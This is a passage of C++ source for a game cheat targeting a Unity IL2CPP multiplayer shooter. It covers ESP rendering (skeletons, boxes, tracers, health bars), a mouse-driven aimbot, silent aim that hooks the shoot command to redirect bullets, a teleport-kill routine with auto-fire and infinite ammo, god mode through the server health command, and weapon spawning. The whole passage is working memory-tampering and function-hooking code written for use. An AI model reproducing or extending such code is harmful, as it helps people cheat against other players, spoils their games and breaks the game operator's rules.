            DrawChamsSegment(p.rElbow, p.rHand, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);

            DrawChamsSegment(p.root, p.lKnee, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
            DrawChamsSegment(p.lKnee, p.lFoot, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);

            DrawChamsSegment(p.root, p.rKnee, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
            DrawChamsSegment(p.rKnee, p.rFoot, chamsCol, fChamsAlpha, fChamsJointSize, iChamsStyle);
        }

        // 1. Dynamic Skeleton ESP
        if (bDrawSkeleton) {
            DrawBoneLine(p.head, p.chest, colSkeleton, fSkeletonThickness + 0.5f);
            DrawBoneLine(p.chest, p.spine, colSkeleton, fSkeletonThickness + 0.5f);
            DrawBoneLine(p.spine, p.root, colSkeleton, fSkeletonThickness + 0.5f);

            // Left Arm
            DrawBoneLine(p.chest, p.lShoulder, colSkeleton, fSkeletonThickness);
            DrawBoneLine(p.lShoulder, p.lUpperArm, colSkeleton, fSkeletonThickness);
            DrawBoneLine(p.lUpperArm, p.lElbow, colSkeleton, fSkeletonThickness);
            DrawBoneLine(p.lElbow, p.lHand, colSkeleton, fSkeletonThickness);

            // Right Arm
            DrawBoneLine(p.chest, p.rShoulder, colSkeleton, fSkeletonThickness);
            DrawBoneLine(p.rShoulder, p.rUpperArm, colSkeleton, fSkeletonThickness);
            DrawBoneLine(p.rUpperArm, p.rElbow, colSkeleton, fSkeletonThickness);
            DrawBoneLine(p.rElbow, p.rHand, colSkeleton, fSkeletonThickness);

            // Left Leg
            DrawBoneLine(p.root, p.lKnee, colSkeleton, fSkeletonThickness);
            DrawBoneLine(p.lKnee, p.lFoot, colSkeleton, fSkeletonThickness);

            // Right Leg
            DrawBoneLine(p.root, p.rKnee, colSkeleton, fSkeletonThickness);
            DrawBoneLine(p.rKnee, p.rFoot, colSkeleton, fSkeletonThickness);
        }

        // 2. Head Circle ESP
        if (bDrawHeadCircle && p.head.valid) {
            float headRadius = (p.distance > 0.1f) ? (18.0f / p.distance * fHeadCircleSize) : 8.0f;
            if (headRadius < 3.0f) headRadius = 3.0f;
            if (headRadius > 35.0f) headRadius = 35.0f;

            ImVec2 headPos(p.head.screen.x, sh - p.head.screen.y);

            if (bEnableGlow) {
                ImU32 glowHead1 = MakeGlowColor(colHeadCircle, 0.15f * fGlowIntensity);
                ImU32 glowHead2 = MakeGlowColor(colHeadCircle, 0.35f * fGlowIntensity);
                dl->AddCircle(headPos, headRadius + 3.0f, glowHead1, 16, 3.0f);
                dl->AddCircle(headPos, headRadius + 1.5f, glowHead2, 16, 2.0f);
            }

            ImU32 colHead = MakeGlowColor(colHeadCircle, 1.0f);
            dl->AddCircle(headPos, headRadius, colHead, 16, 1.8f);
        }

        // 3. Dynamic 2D Hitbox Bounding Box
        if (bDrawBoxes) {
            ImVec2 bMin(p.boxMinX, p.boxMinY);
            ImVec2 bMax(p.boxMaxX, p.boxMaxY);

            if (bEnableGlow) {
                ImU32 glowBoxOuter = MakeGlowColor(pCol, 0.15f * fGlowIntensity);
                ImU32 glowBoxMid   = MakeGlowColor(pCol, 0.30f * fGlowIntensity);
                dl->AddRect(ImVec2(bMin.x - 3.0f, bMin.y - 3.0f), ImVec2(bMax.x + 3.0f, bMax.y + 3.0f), glowBoxOuter, 4.0f, 0, fBoxThickness + 3.0f);
                dl->AddRect(ImVec2(bMin.x - 1.5f, bMin.y - 1.5f), ImVec2(bMax.x + 1.5f, bMax.y + 1.5f), glowBoxMid,   3.0f, 0, fBoxThickness + 1.5f);
            }

            dl->AddRect(bMin, bMax, colMain, 2.0f, 0, fBoxThickness);
        }

        // 4. Tracers (Snaplines)
        if (bDrawTracers) {
            ImVec2 originPos;
            if (iTracerOrigin == 0)      originPos = ImVec2(sw * 0.5f, sh);
            else if (iTracerOrigin == 1) originPos = ImVec2(sw * 0.5f, sh * 0.5f);
            else                         originPos = ImVec2(sw * 0.5f, 0.0f);

            ImVec2 targetPos;
            if (p.chest.valid) {
                targetPos = ImVec2(p.chest.screen.x, sh - p.chest.screen.y);
            } else {
                targetPos = ImVec2((p.boxMinX + p.boxMaxX) * 0.5f, p.boxMaxY);
            }

            if (bEnableGlow) {
                ImU32 glowTracOuter = MakeGlowColor(colTracers, 0.20f * fGlowIntensity);
                dl->AddLine(originPos, targetPos, glowTracOuter, fTracerThickness + 2.5f);
            }

            dl->AddLine(originPos, targetPos, colTrac, fTracerThickness);
        }

        // 5. Health Bar
        if (bDrawHealthBar && p.maxHp > 0) {
            float ratio = (float)p.hp / (float)p.maxHp;
            if (ratio < 0.0f) ratio = 0.0f;
            if (ratio > 1.0f) ratio = 1.0f;

            float boxH   = p.boxMaxY - p.boxMinY;
            float barX   = p.boxMinX - 7.0f;
            float barTop = p.boxMinY;
            float barBot = p.boxMaxY;

            dl->AddRectFilled(
                ImVec2(barX - 4.0f, barTop),
                ImVec2(barX, barBot),
                IM_COL32(10, 12, 16, 200)
            );

            ImU32 hpCol = ratio > 0.6f
                ? IM_COL32(50,  230, 80,  255)
                : ratio > 0.3f
                    ? IM_COL32(250, 210, 40,  255)
                    : IM_COL32(255, 45,  45,  255);

            dl->AddRectFilled(
                ImVec2(barX - 4.0f, barBot - boxH * ratio),
                ImVec2(barX, barBot),
                hpCol
            );
        }

        // 6. Distance & Info Text
        if (bDrawInfoText) {
            char buf[48];
            snprintf(buf, sizeof(buf), "%s | %d HP [%.0fm]", p.isEnemy ? "ENEMY" : "TEAM", p.hp, p.distance);

            dl->AddText(ImVec2(p.boxMinX + 1.0f, p.boxMinY - 17.0f + 1.0f), IM_COL32(0, 0, 0, 220), buf);
            dl->AddText(ImVec2(p.boxMinX, p.boxMinY - 17.0f), colMain, buf);
        }
    }

    // Draw Aimbot FOV circle if enabled
    if (bEnableAimbot && bDrawAimbotFOV) {
        if (bEnableGlow) {
            dl->AddCircle(
                ImVec2(sw * 0.5f, sh * 0.5f),
                aimbotFOV,
                IM_COL32(120, 180, 255, (int)(45 * fGlowIntensity)),
                64,
                3.0f
            );
        }
        dl->AddCircle(
            ImVec2(sw * 0.5f, sh * 0.5f),
            aimbotFOV,
            IM_COL32(255, 255, 255, 120),
            64,
            1.5f
        );
    }

    // Draw Silent Aim FOV circle if enabled
    if (bEnableSilentAim && bDrawSilentAimFOV && !bSilentAimFull360) {
        if (bEnableGlow) {
            dl->AddCircle(
                ImVec2(sw * 0.5f, sh * 0.5f),
                fSilentAimFOV,
                IM_COL32(255, 90, 140, (int)(45 * fGlowIntensity)),
                64,
                3.0f
            );
        }
        dl->AddCircle(
            ImVec2(sw * 0.5f, sh * 0.5f),
            fSilentAimFOV,
            IM_COL32(255, 120, 170, 140),
            64,
            1.5f
        );
    }
}

// ─── Configurable & Smooth Aimbot (Default Key: Left Alt) ───────────────────
static void DoAimbot(ImGuiIO& io) {
    if (g_ShowMenu) return;
    if (!bEnableAimbot) return;
    if (!IsKeyActive(iAimbotKey)) return;

    float cx = io.DisplaySize.x * 0.5f;
    float cy = io.DisplaySize.y * 0.5f;
    float sh = io.DisplaySize.y;

    float bestDist = aimbotFOV;
    float tgtX = -1.0f, tgtY = -1.0f;

    for (const auto& p : g_ESPData) {
        if (!p.hasBox || (p.isLocal && bIgnoreLocal))
            continue;
        if (bIgnoreDead && (p.isDead || p.hp <= 0))
            continue;
        if (bIgnoreTeammates && !p.isEnemy)
            continue;

        Vector3 targetBone = (iAimbotTarget == 1 && p.head.valid) ? p.head.screen : p.aimScreenPos;
        if (targetBone.z <= 0.5f || std::isnan(targetBone.x) || std::isnan(targetBone.y))
            continue;

        float sx = targetBone.x;
        float sy = sh - targetBone.y;

        float dist = sqrtf((sx - cx) * (sx - cx) + (sy - cy) * (sy - cy));
        if (dist < bestDist) {
            bestDist = dist;
            tgtX = sx;
            tgtY = sy;
        }
    }

    if (tgtX > 0.0f && tgtY > 0.0f) {
        float smooth = (aimbotSmooth < 1.0f) ? 1.0f : aimbotSmooth;
        float dx = (tgtX - cx) / smooth;
        float dy = (tgtY - cy) / smooth;

        if (!std::isnan(dx) && !std::isinf(dx) && !std::isnan(dy) && !std::isinf(dy)) {
            if (dx >  aimbotMaxSpeed) dx =  aimbotMaxSpeed;
            if (dx < -aimbotMaxSpeed) dx = -aimbotMaxSpeed;
            if (dy >  aimbotMaxSpeed) dy =  aimbotMaxSpeed;
            if (dy < -aimbotMaxSpeed) dy = -aimbotMaxSpeed;

            mouse_event(MOUSEEVENTF_MOVE, (DWORD)(long)dx, (DWORD)(long)dy, 0, 0);
        }
    }
}

// ─── Silent Aim Hook & Logic (100% Hit Any Shot Anywhere) ────────────────────
static bool GetSilentAimTargetPosition(Vector3* outTargetPos) {
    if (!outTargetPos || !g_PlayerClass) return false;

    Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
    if (!arr) return false;

    uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
    void** items = (void**)((char*)arr + 0x20);

    void* localPlayer = nullptr;
    bool localAwayTeam = false;
    bool foundLocal = false;

    for (uintptr_t i = 0; i < count; i++) {
        void* p = items[i];
        if (p && g_Il2Cpp.IsLocalPlayer(p)) {
            localPlayer = p;
            foundLocal = true;
            if (g_PlayerMovementClass) {
                void* pm = g_Il2Cpp.GetComponent(p, g_PlayerMovementClass);
                if (pm) localAwayTeam = *(bool*)((char*)pm + 0x1C4);
            }
            break;
        }
    }

    void* activeCam = GetCurrentGameCamera();
    ImGuiIO& io = ImGui::GetIO();
    float cx = io.DisplaySize.x * 0.5f;
    float cy = io.DisplaySize.y * 0.5f;
    float sh = io.DisplaySize.y;

    float bestScore = 9999999.0f;
    Vector3 bestPos{};
    bool found = false;

    for (uintptr_t i = 0; i < count; i++) {
        void* p = items[i];
        if (!p || p == localPlayer || g_Il2Cpp.IsLocalPlayer(p)) continue;
        if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p) || !g_Il2Cpp.IsSpawned(p)) continue;

        // Health / Dead check
        int enemyHp = 100;
        if (g_HealthClass) {
            void* hComp = g_Il2Cpp.GetComponent(p, g_HealthClass);
            if (hComp) {
                if (g_IsDeadMethod) {
                    void* exc = nullptr;
                    Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_IsDeadMethod, hComp, nullptr, &exc);
                    if (res && !exc && *(bool*)((char*)res + 0x10)) continue;
                }
                if (g_GetCurrentHealth) {
                    void* exc = nullptr;
                    Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_GetCurrentHealth, hComp, nullptr, &exc);
                    if (res && !exc) enemyHp = *(int*)((char*)res + 0x10);
                    if (enemyHp <= 0) continue;
                }
            }
        }

        // Team check
        bool enemyAwayTeam = false;
        void* enemyPM = g_PlayerMovementClass ? g_Il2Cpp.GetComponent(p, g_PlayerMovementClass) : nullptr;
        if (enemyPM) {
            enemyAwayTeam = *(bool*)((char*)enemyPM + 0x1C4);
        } else if (g_SharedRefClass) {
            void* sr = g_Il2Cpp.GetComponent(p, g_SharedRefClass);
            if (sr) enemyAwayTeam = *(bool*)((char*)sr + 0x108);
        }

        if (bIgnoreTeammates && foundLocal && (enemyAwayTeam == localAwayTeam)) continue;

        // Target bone position
        void* chestRb = *(void**)((char*)p + 0x170);
        void* rootRb  = *(void**)((char*)p + 0x108);
        void* targetRb = chestRb ? chestRb : rootRb;
        if (!targetRb) continue;

        Vector3 bonePos{};
        if (!g_Il2Cpp.GetRigidbodyPosition(targetRb, &bonePos)) continue;
        if (fabsf(bonePos.x) < 0.001f && fabsf(bonePos.y) < 0.001f && fabsf(bonePos.z) < 0.001f) continue;

        if (iSilentAimTarget == 1) {
            // Head position (Chest + 0.40m up)
            bonePos = bonePos + Vector3(0.0f, 0.40f, 0.0f);
        }

        float score = 0.0f;
        if (!bSilentAimFull360 && activeCam) {
            Vector3 screenPos{};
            if (!g_Il2Cpp.WorldToScreen(activeCam, bonePos, &screenPos) || screenPos.z <= 0.3f) {
                continue;
            }
            float sx = screenPos.x;
            float sy = sh - screenPos.y;
            float distFromCenter = sqrtf((sx - cx) * (sx - cx) + (sy - cy) * (sy - cy));
            if (distFromCenter > fSilentAimFOV) continue;
            score = distFromCenter;
        } else {
            // Full 360 map aimbot: prioritize nearest target
            score = 1.0f;
        }

        if (score < bestScore) {
            bestScore = score;
            bestPos = bonePos;
            found = true;
        }
    }

    if (found) {
        *outTargetPos = bestPos;
        return true;
    }
    return false;
}

typedef void (*CMDShoot_t)(void* __this, Il2CppArray* _cameraPosition, Il2CppArray* _cameraForward, uint32_t tick, const MethodInfo* method);
CMDShoot_t oCMDShoot = nullptr;

void hkCMDShoot(void* __this, Il2CppArray* _cameraPosition, Il2CppArray* _cameraForward, uint32_t tick, const MethodInfo* method) {
    if (bEnableSilentAim && _cameraPosition && _cameraForward) {
        Vector3 targetWorldPos{};
        if (GetSilentAimTargetPosition(&targetWorldPos)) {
            Vector3 camPos{};
            if (g_UnpackShortMethod) {
                void* args[1] = { _cameraPosition };
                void* exc = nullptr;
                Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_UnpackShortMethod, nullptr, args, &exc);
                if (!exc && res) {
                    camPos = *(Vector3*)((char*)res + 0x10);
                }
            }

            if (camPos.LengthSq() < 0.0001f) {
                void* activeCam = GetCurrentGameCamera();
                if (activeCam) {
                    void* camTr = g_Il2Cpp.GetComponentTransform(activeCam);
                    if (camTr) g_Il2Cpp.GetTransformPosition(camTr, &camPos);
                }
            }

            Vector3 aimDir = targetWorldPos - camPos;
            float len = aimDir.Length();
            if (len > 0.001f) {
                aimDir = aimDir * (1.0f / len);

                if (g_PackDirectionMethod) {
                    void* args[1] = { &aimDir };
                    void* exc = nullptr;
                    Il2CppObject* packedArr = g_Il2Cpp.il2cpp_runtime_invoke(g_PackDirectionMethod, nullptr, args, &exc);
                    if (!exc && packedArr) {
                        _cameraForward = (Il2CppArray*)packedArr;
                    }
                }
            }
        }
    }

    if (oCMDShoot) {
        oCMDShoot(__this, _cameraPosition, _cameraForward, tick, method);
    }
}

// ─── Instant Teleportation & Auto-Shoot Kill Aura (Auto-Cycle Targets) ───────
static uintptr_t g_CurrentTeleportTarget = 0;
static ULONGLONG g_LastTeleShootTime = 0;
static ULONGLONG g_LastTeleportTime  = 0;  // Rate-limiter to prevent PhysX crash

static void DoTeleportKill(ImGuiIO& io) {
    if (g_ShowMenu) return;
    if (!bEnableTeleportKill) return;
    if (bTeleportHoldKey && !IsKeyActive(iTeleportKey)) return;
    if (!g_PlayerClass) return;

    ULONGLONG now = GetTickCount64();

    // ─── CRITICAL FIX: Rate-limit teleportation to prevent PhysX crash ───
    // Without this throttle, we call MoveRigidbody 60+ times per second which
    // overwhelms Unity's physics step and causes 0xC0000005 in UnityPlayer.dll
    if (now - g_LastTeleportTime < 250) return;
    g_LastTeleportTime = now;

    __try {
        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        if (!arr) return;

        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
        void** items = (void**)((char*)arr + 0x20);

        void* localPlayer = nullptr;
        void* localPlayerMovement = nullptr;
        bool localAwayTeam = false;
        bool foundLocal = false;

        for (uintptr_t i = 0; i < count; i++) {
            void* p = items[i];
            if (p && g_Il2Cpp.IsLocalPlayer(p)) {
                localPlayer = p;
                foundLocal = true;
                if (g_PlayerMovementClass) {
                    localPlayerMovement = g_Il2Cpp.GetComponent(p, g_PlayerMovementClass);
                    if (localPlayerMovement) {
                        localAwayTeam = *(bool*)((char*)localPlayerMovement + 0x1C4);
                    }
                }
                break;
            }
        }

        if (!localPlayer || !foundLocal) return;

        // CRITICAL: Don't teleport if local player is dead or not yet spawned
        if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(localPlayer)) return;
        if (!g_Il2Cpp.IsSpawned(localPlayer)) return;

        // Check if local player is dead
        if (g_HealthClass) {
            void* hComp = g_Il2Cpp.GetComponent(localPlayer, g_HealthClass);
            if (hComp && g_IsDeadMethod) {
                void* exc = nullptr;
                Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_IsDeadMethod, hComp, nullptr, &exc);
                if (res && !exc && *(bool*)((char*)res + 0x10)) {
                    g_CurrentTeleportTarget = 0;  // Reset target on death
                    return;
                }
            }
        }

        // Helper lambda to check if a player pointer is valid and alive
        auto IsValidAliveEnemy = [&](void* p, int& outHp, Vector3& outPos, Vector3& outFwd) -> bool {
            if (!p || p == localPlayer || g_Il2Cpp.IsLocalPlayer(p)) return false;
            if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p) || !g_Il2Cpp.IsSpawned(p)) return false;

            outHp = 100;
            if (g_HealthClass) {
                void* hComp = g_Il2Cpp.GetComponent(p, g_HealthClass);
                if (hComp) {
                    if (g_IsDeadMethod) {
                        void* exc = nullptr;
                        Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_IsDeadMethod, hComp, nullptr, &exc);
                        if (res && !exc && *(bool*)((char*)res + 0x10)) return false;
                    }
                    if (g_GetCurrentHealth) {
                        void* exc = nullptr;
                        Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_GetCurrentHealth, hComp, nullptr, &exc);
                        if (res && !exc) outHp = *(int*)((char*)res + 0x10);
                        if (outHp <= 0) return false;
                    }
                }
            }

            bool enemyAwayTeam = false;
            void* enemyPM = g_PlayerMovementClass ? g_Il2Cpp.GetComponent(p, g_PlayerMovementClass) : nullptr;
            if (enemyPM) {
                enemyAwayTeam = *(bool*)((char*)enemyPM + 0x1C4);
            } else if (g_SharedRefClass) {
                void* sr = g_Il2Cpp.GetComponent(p, g_SharedRefClass);
                if (sr) enemyAwayTeam = *(bool*)((char*)sr + 0x108);
            }

            if (bIgnoreTeammates && foundLocal && (enemyAwayTeam == localAwayTeam)) return false;

            void* chestRb = *(void**)((char*)p + 0x170);
            void* rootRb  = *(void**)((char*)p + 0x108);
            void* targetRb = chestRb ? chestRb : rootRb;
            if (!targetRb) return false;

            if (!g_Il2Cpp.GetRigidbodyPosition(targetRb, &outPos)) return false;
            if (fabsf(outPos.x) < 0.001f && fabsf(outPos.y) < 0.001f && fabsf(outPos.z) < 0.001f) return false;

            outFwd = Vector3(0.0f, 0.0f, 1.0f);
            if (enemyPM) {
                void* orientTr = *(void**)((char*)enemyPM + 0x100);
                if (orientTr) g_Il2Cpp.GetTransformForward(orientTr, &outFwd);
            }

            return true;
        };

        // Get current local root position
        Vector3 localRootPos{};
        void* localRootRb = *(void**)((char*)localPlayer + 0x108);
        void* localChestRb = *(void**)((char*)localPlayer + 0x170);
        void* localMainRb = localRootRb ? localRootRb : localChestRb;
        if (!localMainRb || !g_Il2Cpp.GetRigidbodyPosition(localMainRb, &localRootPos)) return;

        // Verify current target or find next target
        void* chosenEnemy = nullptr;
        Vector3 chosenEnemyPos{};
        Vector3 chosenEnemyFwd(0.0f, 0.0f, 1.0f);
        int chosenEnemyHp = 100;

        if (g_CurrentTeleportTarget != 0) {
            bool targetStillValid = false;
            for (uintptr_t i = 0; i < count; i++) {
                if ((uintptr_t)items[i] == g_CurrentTeleportTarget) {
                    if (IsValidAliveEnemy(items[i], chosenEnemyHp, chosenEnemyPos, chosenEnemyFwd)) {
                        chosenEnemy = items[i];
                        targetStillValid = true;
                    }
                    break;
                }
            }
            if (!targetStillValid) {
                g_CurrentTeleportTarget = 0;
                chosenEnemy = nullptr;
            }
        }

        // If no active target, find the best/random/next alive enemy
        if (!chosenEnemy) {
            std::vector<void*> validEnemies;
            std::vector<Vector3> validPositions;
            std::vector<Vector3> validForwards;
            std::vector<int> validHps;

            for (uintptr_t i = 0; i < count; i++) {
                void* p = items[i];
                Vector3 ePos, eFwd;
                int eHp;
                if (IsValidAliveEnemy(p, eHp, ePos, eFwd)) {
                    validEnemies.push_back(p);
                    validPositions.push_back(ePos);
                    validForwards.push_back(eFwd);
                    validHps.push_back(eHp);
                }
            }

            if (validEnemies.empty()) return;

            size_t selectedIndex = 0;
            if (iTeleportTargetMode == 0) {
                selectedIndex = (size_t)(rand() % validEnemies.size());
            } else if (iTeleportTargetMode == 1) {
                float bestDist = 999999.0f;
                for (size_t i = 0; i < validEnemies.size(); i++) {
                    float d = (validPositions[i] - localRootPos).Length();
                    if (d < bestDist) {
                        bestDist = d;
                        selectedIndex = i;
                    }
                }
            } else if (iTeleportTargetMode == 2) {
                int lowestHp = 999999;
                for (size_t i = 0; i < validEnemies.size(); i++) {
                    if (validHps[i] < lowestHp) {
                        lowestHp = validHps[i];
                        selectedIndex = i;
                    }
                }
            }

            chosenEnemy = validEnemies[selectedIndex];
            chosenEnemyPos = validPositions[selectedIndex];
            chosenEnemyFwd = validForwards[selectedIndex];
            chosenEnemyHp = validHps[selectedIndex];
            g_CurrentTeleportTarget = (uintptr_t)chosenEnemy;
        }

        if (!chosenEnemy) return;

        // Normalize forward vector
        float fwdLen = chosenEnemyFwd.Length();
        if (fwdLen > 0.001f) {
            chosenEnemyFwd = chosenEnemyFwd * (1.0f / fwdLen);
        } else {
            chosenEnemyFwd = Vector3(0.0f, 0.0f, 1.0f);
        }

        // Calculate destination position based on offset mode
        Vector3 destPos = chosenEnemyPos;
        if (iTeleportPosition == 0) {
            // Behind Enemy (Backstab)
            destPos = chosenEnemyPos - chosenEnemyFwd * fTeleportDistance + Vector3(0.0f, fTeleportHeight, 0.0f);
        } else if (iTeleportPosition == 1) {
            // Above Enemy (Sky Drop)
            destPos = chosenEnemyPos + Vector3(0.0f, fTeleportDistance + 1.2f, 0.0f);
        } else if (iTeleportPosition == 2) {
            // In Front of Enemy
            destPos = chosenEnemyPos + chosenEnemyFwd * fTeleportDistance + Vector3(0.0f, fTeleportHeight, 0.0f);
        } else {
            // Directly on Target
            destPos = chosenEnemyPos + Vector3(0.0f, fTeleportHeight, 0.0f);
        }

        // Safe Root & Torso Movement (Crash-Proof for PhysX)
        if (localRootRb) {
            g_Il2Cpp.MoveRigidbodyPosition(localRootRb, destPos);
            g_Il2Cpp.SetRigidbodyLinearVelocity(localRootRb, Vector3(0.0f, 0.0f, 0.0f));
            g_Il2Cpp.SetRigidbodyAngularVelocity(localRootRb, Vector3(0.0f, 0.0f, 0.0f));
            void* tr = g_Il2Cpp.GetComponentTransform(localRootRb);
            if (tr) g_Il2Cpp.SetTransformPosition(tr, destPos);
        }

        if (localChestRb && localChestRb != localRootRb) {
            g_Il2Cpp.MoveRigidbodyPosition(localChestRb, destPos + Vector3(0.0f, 0.35f, 0.0f));
            g_Il2Cpp.SetRigidbodyLinearVelocity(localChestRb, Vector3(0.0f, 0.0f, 0.0f));
            g_Il2Cpp.SetRigidbodyAngularVelocity(localChestRb, Vector3(0.0f, 0.0f, 0.0f));
        }

        // Sync root GameObject transform and orientation
        if (localPlayerMovement) {
            void* rootGo = *(void**)((char*)localPlayerMovement + 0x178);
            if (rootGo) {
                void* rootTr = g_Il2Cpp.GetComponentTransform(rootGo);
                if (rootTr) g_Il2Cpp.SetTransformPosition(rootTr, destPos);
            }
            void* orientTr = *(void**)((char*)localPlayerMovement + 0x100);
            if (orientTr) {
                g_Il2Cpp.SetTransformPosition(orientTr, destPos);
            }
            void* rCamCtrl = *(void**)((char*)localPlayerMovement + 0x220);
            if (rCamCtrl) {
                void* camTarget = *(void**)((char*)rCamCtrl + 0x100);
                if (camTarget) g_Il2Cpp.SetTransformPosition(camTarget, destPos + Vector3(0.0f, 0.5f, 0.0f));
                void* orientTarget = *(void**)((char*)rCamCtrl + 0x110);
                if (orientTarget) g_Il2Cpp.SetTransformPosition(orientTarget, destPos);
            }
        }

        // Auto-Aim Snap to Target Screen Position
        void* activeCam = GetCurrentGameCamera();
        if (bTeleportLookAt && activeCam) {
            float cx = io.DisplaySize.x * 0.5f;
            float cy = io.DisplaySize.y * 0.5f;
            float sh = io.DisplaySize.y;
            Vector3 aimSc{};
            if (g_Il2Cpp.WorldToScreen(activeCam, chosenEnemyPos + Vector3(0.0f, 0.25f, 0.0f), &aimSc) && aimSc.z > 0.3f) {
                float sx = aimSc.x;
                float sy = sh - aimSc.y;
                float dx = sx - cx;
                float dy = sy - cy;
                if (!std::isnan(dx) && !std::isnan(dy) && (fabsf(dx) > 1.0f || fabsf(dy) > 1.0f)) {
                    mouse_event(MOUSEEVENTF_MOVE, (DWORD)(long)dx, (DWORD)(long)dy, 0, 0);
                }
            }
        }

        // Auto-Shooting (happens every fTeleportShootRate ms)
        if (bTeleportAutoShoot && (now - g_LastTeleShootTime >= (ULONGLONG)fTeleportShootRate)) {
            g_LastTeleShootTime = now;

            if (g_WeaponManagerClass && g_ClientTryShoot) {
                void* wm = g_Il2Cpp.GetComponent(localPlayer, g_WeaponManagerClass);
                if (wm) {
                    void* activeWeapon = *(void**)((char*)wm + 0x120);
                    if (activeWeapon) {
                        // Refill ammo & reset fire timer before shoot
                        *(bool*)((char*)activeWeapon + 0x120) = true;
                        *(int*)((char*)activeWeapon + 0x114)  = 99999;
                        *(float*)((char*)activeWeapon + 0x110) = 0.0f;

                        void* exc = nullptr;
                        g_Il2Cpp.il2cpp_runtime_invoke(g_ClientTryShoot, activeWeapon, nullptr, &exc);
                    }
                }
            }

            // Simulate left-click for games that read raw mouse input
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        }

        // After confirming a kill of our target, auto-advance to the next enemy
        if (chosenEnemy && g_HealthClass) {
            void* targetHComp = g_Il2Cpp.GetComponent(chosenEnemy, g_HealthClass);
            if (targetHComp) {
                bool targetDead = false;
                if (g_IsDeadMethod) {
                    void* exc = nullptr;
                    Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_IsDeadMethod, targetHComp, nullptr, &exc);
                    if (res && !exc) targetDead = *(bool*)((char*)res + 0x10);
                } else {
                    int hp = 100;
                    if (g_GetCurrentHealth) {
                        void* exc = nullptr;
                        Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_GetCurrentHealth, targetHComp, nullptr, &exc);
                        if (res && !exc) hp = *(int*)((char*)res + 0x10);
                    }
                    targetDead = (hp <= 0);
                }
                if (targetDead) {
                    CheatLog("TeleportKill: Target %p confirmed dead, advancing to next target", chosenEnemy);
                    g_CurrentTeleportTarget = 0;  // Force pick a new target next cycle
                }
            }
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        // Protected from any physics exception
    }
}

// ─── God Mode Routine (Infinite Health & Health Restoration) ─────────────────
static void DoGodMode() {
    if (!bGodMode || !g_PlayerClass || !g_HealthClass) return;

    __try {
        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        if (!arr) return;

        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
        if (count == 0 || count > 64) return;
        void** items = (void**)((char*)arr + 0x20);

        for (uintptr_t i = 0; i < count; i++) {
            void* p = items[i];
            if (p && g_Il2Cpp.IsLocalPlayer(p)) {
                if (!g_Il2Cpp.IsGameObjectActiveInHierarchy(p) || !g_Il2Cpp.IsSpawned(p))
                    break;

                void* hComp = g_Il2Cpp.GetComponent(p, g_HealthClass);
                if (hComp) {
                    bool isDead = false;
                    if (g_IsDeadMethod) {
                        void* exc = nullptr;
                        Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_IsDeadMethod, hComp, nullptr, &exc);
                        if (res && !exc) isDead = *(bool*)((char*)res + 0x10);
                    }

                    int currentHp = 100;
                    if (g_GetCurrentHealth) {
                        void* exc = nullptr;
                        Il2CppObject* res = g_Il2Cpp.il2cpp_runtime_invoke(g_GetCurrentHealth, hComp, nullptr, &exc);
                        if (res && !exc) currentHp = *(int*)((char*)res + 0x10);
                    }

                    if (isDead || currentHp <= 0) {
                        // Allow clean respawn without firing RPCs
                        break;
                    }

                    *(int*)((char*)hComp + 0xF8) = 99999; // maxHealth

                    if (currentHp < 90000 && g_CMDChangeCurrentHealth) {
                        int newHp = 99999;
                        void* args[1] = { &newHp };
                        void* exc = nullptr;
                        g_Il2Cpp.il2cpp_runtime_invoke(g_CMDChangeCurrentHealth, hComp, args, &exc);
                    }
                }
                break;
            }
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
    }
}

// ─── Weapon Spawner & Stat Modifiers ─────────────────────────────────────────
const char* g_WeaponNames[] = {
    "Burst Rifle",
    "Crossbow",
    "Machete (Melee)",
    "Railgun",
    "Rocket Launcher",
    "Shotgun",
    "Sniper Rifle",
    "Standard Blaster"
};

static void GiveWeapon(int weaponIndex) {
    if (!g_PlayerClass || !g_WeaponManagerClass) return;

    __try {
        Il2CppArray* arr = g_Il2Cpp.FindObjectsOfType(g_PlayerClass);
        if (!arr) return;

        uintptr_t count = *(uintptr_t*)((char*)arr + 0x18);
        void** items = (void**)((char*)arr + 0x20);

        for (uintptr_t i = 0; i < count; i++) {
            void* p = items[i];
            if (p && g_Il2Cpp.IsLocalPlayer(p)) {
                void* wm = g_Il2Cpp.GetComponent(p, g_WeaponManagerClass);
                if (wm) {
                    if (g_PickUpMethod) {
                        void* args[1] = { &weaponIndex };
                        void* exc = nullptr;
                        g_Il2Cpp.il2cpp_runtime_invoke(g_PickUpMethod, wm, args, &exc);
                    }
                    if (g_StartPickUpMethod) {
                        void* args[1] = { &weaponIndex };
                        void* exc = nullptr;
                        g_Il2Cpp.il2cpp_runtime_invoke(g_StartPickUpMethod, wm, args, &exc);
                    }

                    void* weaponsList = *(void**)((char*)wm + 0x110);
                    if (weaponsList) {
                        Il2CppArray* wArr = *(Il2CppArray**)((char*)weaponsList + 0x10);
                        int wCount = *(int*)((char*)weaponsList + 0x18);
